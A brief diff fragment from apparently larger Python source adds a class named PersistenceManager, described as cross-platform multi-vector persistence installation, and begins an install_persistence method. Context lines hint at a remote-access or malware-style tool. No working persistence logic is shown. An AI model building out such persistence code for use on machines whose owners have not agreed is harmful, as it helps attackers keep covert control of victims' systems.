@@ -1375,6 +1375,10 @@ $watcher.Stop()
                 }
         except Exception as e:
             return {'error': 'Failed to resolve location'}
+
+class PersistenceManager:
+    """Multi-vector persistence installation and removal (Cross-platform)"""
+
     @staticmethod
     def install_persistence():
         """Install persistence based on platform"""
